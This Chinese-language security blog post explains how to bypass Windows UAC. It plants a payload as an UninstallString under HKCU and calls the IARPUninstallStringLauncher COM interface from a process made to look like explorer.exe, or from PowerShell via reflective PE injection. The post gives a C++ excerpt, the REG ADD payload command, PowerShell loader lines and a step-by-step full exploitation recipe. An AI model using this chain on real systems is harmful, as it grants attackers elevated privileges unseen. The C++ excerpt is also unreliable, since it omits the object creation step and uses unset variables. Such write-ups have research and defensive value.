---
layout: post
title: 通过COM组件IARPUninstallStringLauncher绕过UAC
---


## 0x00 前言
---

在上篇文章[《通过COM组件NetFwPolicy2越权关闭防火墙》](https://3gstudent.github.io/3gstudent.github.io/%E9%80%9A%E8%BF%87COM%E7%BB%84%E4%BB%B6NetFwPolicy2%E8%B6%8A%E6%9D%83%E5%85%B3%E9%97%AD%E9%98%B2%E7%81%AB%E5%A2%99/)验证结论：对于explorer.exe(或是模拟成explorer.exe)，加载高权限的COM组件不会弹出UAC的对话框。同时介绍了如何在注册表中寻找可以高权限运行的COM组件。

本次将要继续，介绍另一个可供使用的COM组件。

在我搜索到`HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{FCC74B77-EC3E-4dd8-A80B-008A702075A9}`时，获得名称`ARP UninstallString Launcher`

经过进一步搜索，发现ExpLife已经公开了这个COM组件的利用方法，地址如下：

http://www.freebuf.com/articles/system/116611.html

感谢ExpLife的分享，缩短了我研究的时间，所以本文将要在此基础上，侧重于分析原理和介绍更多利用方式

## 0x01 简介
---

本文将要介绍以下内容：

- 复现通过COM组件IARPUninstallStringLauncher绕过UAC的方法
- 利用分析
- 更多利用方式


## 0x02 复现通过COM组件IARPUninstallStringLauncher绕过UAC的方法
---

ExpLife是从寻找不会弹出UAC对话框的功能入手，通过逆向找到可供利用的COM组件

而我的思路是先找到支持提升权限的COM组件，然后查找这个COM组件对应的功能

两种方法各有利弊：

- ExpLife的方法需要对系统有足够了解，得找到不会弹出UAC对话框的功能
- 我采用的方法能够找到一些不常见的COM组件，其中的功能在平时也许很难接触
- 但使用Explife的方法，如果找到了一个功能，使用动态下断点和静态分析的方法对COM组件的逆向会很高效
- 而我采用的方法只能通过注册表键值内容做一个大概的判断，需要进一步搜索才能定位具体的COM组件，效率不高

可以将两种方法相结合，但最重要的一点，找到的COM组件不仅要能够提升权限，还要能够执行程序(或是其他有用的功能)才可以

下面开始介绍利用原理：

### 1、“偷偷”绕过UAC

在之前的文章[《渗透基础——获得当前系统已安装的程序列表》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E8%8E%B7%E5%BE%97%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E5%B7%B2%E5%AE%89%E8%A3%85%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%88%97%E8%A1%A8/)曾提到过`控制面板` -> `程序` -> `程序和功能`中的程序列表对应以下注册表键值：

- 高权限程序对应注册表键值`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\`
- 低权限程序对应注册表键值`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Uninstall\`(实际上为`HKEY_USERS\[sid]\Software\Microsoft\Windows\CurrentVersion\Uninstall\`)

在卸载程序时，同时会删除程序对应的注册表键值

而我们在删除高权限的程序时，会删除`HKEY_LOCAL_MACHINE\`下的键值，正常情况下该操作会弹出UAC对话框，但实际上并没有，这里就可以判断系统“偷偷”绕过了UAC

如果我们能够模拟这个功能，那么也能“偷偷”绕过UAC

### 2、执行程序

注册表项Uninstall下有一个键为"UninstallString"，内容为要执行的命令

如果我们替换成payload，就能实现高权限执行，即UAC绕过并执行任意程序

以上两点相结合，满足了通过COM组件绕过UAC的必要条件

所以，接下来只要能够模拟卸载程序的功能即可

逆向分析过程和模拟卸载的功能ExpLife在他的文章中已经写得很详细，不再赘述

引用文中的分析：

> 通过调用位于CARPUninstallStringLauncherCOM组件中IARPUninstallStringLauncher接口的LaunchUninstallStringAndWait方法来实现卸载程序

关键代码如下：

```
	CLSID  clsid;
	IID iid;
	LPVOID ppv = NULL;
	HRESULT hr;
	PFN_IARPUninstallStringLauncher_LaunchUninstallStringAndWait pfn_LaunchUninstallStringAndWait = NULL;
	PFN_IARPUninstallStringLauncher_Release pfn_IARPUninstallStringLauncher_Release = NULL;
	if (IIDFromString(L"{FCC74B77-EC3E-4DD8-A80B-008A702075A9}", &clsid) ||
		IIDFromString(L"{F885120E-3789-4FD9-865E-DC9B4A6412D2}", &iid))
	return 0;
	CoInitialize(NULL);
	if (SUCCEEDED(hr))
	{
			pfn_LaunchUninstallStringAndWait  = (PFN_IARPUninstallStringLauncher_LaunchUninstallStringAndWait)(*(DWORD*)(*(DWORD*)ppv + 12));
			pfn_IARPUninstallStringLauncher_Release = (PFN_IARPUninstallStringLauncher_Release)(*(DWORD*)(*(DWORD*)ppv + 8));
			if (pfn_LaunchUninstallStringAndWait && pfn_IARPUninstallStringLauncher_Release)
			{
				pfn_LaunchUninstallStringAndWait((LPVOID*)ppv, 0, L"{18E78D31-BBCC-4e6f-A21D-0A15BBC62D49}", 0, NULL);
				pfn_IARPUninstallStringLauncher_Release((LPVOID*)ppv);
			}
	}
	CoUninitialize();
	return 0;
```

其中`"{18E78D31-BBCC-4e6f-A21D-0A15BBC62D49}"`对应注册表Uninstall下的键名称

所以我们需要提前在注册表Uninstall下新建一个键

由于是绕过UAC，代表我们还没有管理员权限，因此无法操作注册表`HKEY_LOCAL_MACHINE`

所以只能操作注册表`HKEY_CURRENT_USER`

通过cmd新建注册表项，并添加payload，命令如下：

```
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Uninstall\payload" /v UninstallString /t REG_SZ /d "c:\windows\system32\calc.exe" /f
```

实际创建的位置为`HKEY_USERS\[sid]\Software\Microsoft\Windows\CurrentVersion\Uninstall\payload`，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-22/2-1.png)

**注：**

如果想要自己在注册表界面新建键值进行测试，创建的位置为`HKEY_USERS\[sid]\`，而不是`HKEY_CURRENT_USER`

接下来，还需要做的是修改当前进程的PEB结构，欺骗PSAPI，将当前进程模拟为explorer.exe，这样就能够“偷偷”绕过UAC，不会弹框

可供参考的地址：

https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/MasqueradePEB.cpp

将以上代码整合，完整的实现代码如下：

https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/IARPUninstallStringLauncher.cpp

**补充：**

对于COM组件IARPUninstallStringLauncher，在执行"UninstallString"时，只有启动的程序结束以后当前进程才会自动退出

## 0x03 更多利用方式
---

关于更多利用方式，指的是模拟成白名单进程的方法

0x02的实例是修改当前进程PEB结构，将当前进程模拟为explorer.exe

当然也可以直接用ExpLife的两个方法：dll注入和通过rundll32加载dll

这里再给出一个利用方式：通过Powershell调用COM组件，默认powershell.exe是可信进程，所以也不会弹出UAC的对话框

这里需要使用powershell脚本Invoke-ReflectivePEInjection.ps1，下载地址：

https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1

提供的一个功能是在powershell的内存中加载exe

为了使我们的程序扩展性更强，将源代码改成支持传入参数的方式，参数为要读取的注册表项，完整代码如下：

https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/IARPUninstallStringLauncher(argv).cpp

接着使用Invoke-ReflectivePEInjection.ps1封装exe，并传入参数，powershell的代码如下：

```
$PEBytes = [IO.File]::ReadAllBytes('c:\\test\\IARPUninstallStringLauncher.exe')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "payload"
```

其中参数payload对应注册表项`HKEY_USERS\[sid]\Software\Microsoft\Windows\CurrentVersion\Uninstall\payload`，其中的键"UninstallString"存储要执行的程序路径

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-22/3-1.png)

通过powershell执行Invoke-ReflectivePEInjection.ps1，在powershell.exe的内存中加载IARPUninstallStringLauncher.exe，以高权限调用COM组件，由于powershell.exe为可信进程，所以能够直接绕过UAC

**注：**

实际测试的一个小bug，在执行完payload后，powershell进程在退出时会弹框报错，提示内存不可读，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-22/3-2.png)

一个最简单的解决方法：

在脚本Main函数末尾加1

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-22/3-3.png)


完整利用方式：

1、新建注册表，并写入要执行的程序路径，命令如下：

```
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Uninstall\payload" /v UninstallString /t REG_SZ /d "c:\windows\system32\calc.exe" /f
```

2、编译IARPUninstallStringLauncher.exe

源码地址：

https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/IARPUninstallStringLauncher(argv).cpp

3、通过powershell脚本加载exe并传入参数，powershell命令如下：


```
$PEBytes = [IO.File]::ReadAllBytes('c:\\test\\IARPUninstallStringLauncher.exe')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "payload"
```

**注：**

原脚本Main函数末尾记得加1，防止报错


## 0x04 小结
---

本文介绍了通过COM组件IARPUninstallStringLauncher绕过UAC的方法，分享多种利用方式(修改PEB模拟成explorer.exe+以powershell.exe加载exe)，得出结论：只要以(或者模拟成)可信的进程(如explorer.exe、powershell.exe)，加载高权限的COM组件不会弹出UAC的对话框。



---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)

